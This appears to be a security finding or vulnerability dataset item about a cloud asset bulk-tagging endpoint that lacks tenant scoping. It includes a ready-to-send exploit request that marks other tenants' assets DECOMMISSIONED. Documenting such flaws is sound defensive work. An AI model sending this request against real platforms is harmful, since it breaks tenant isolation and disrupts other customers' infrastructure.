diagnosis: The endpoint executes a bulk update on CloudAsset using a PostgreSQL __contained_by JSON lookup without restricting the query to the caller's cloud organization. An attacker passing an empty dict or broad superset can inadvertently or maliciously rewrite the operational status of server assets and databases across all tenants on the platform.
exploit_request:
POST /api/infrastructure/assets/batch-tag/ HTTP/1.1
Host: ops.multicloud-orchestrator.io
Authorization: Bearer <tenant_dev_token>
Content-Type: application/json

{"match_tags": {"env": "staging", "tier": "web"}, "applied_tags": {"status": "DECOMMISSIONED"}}
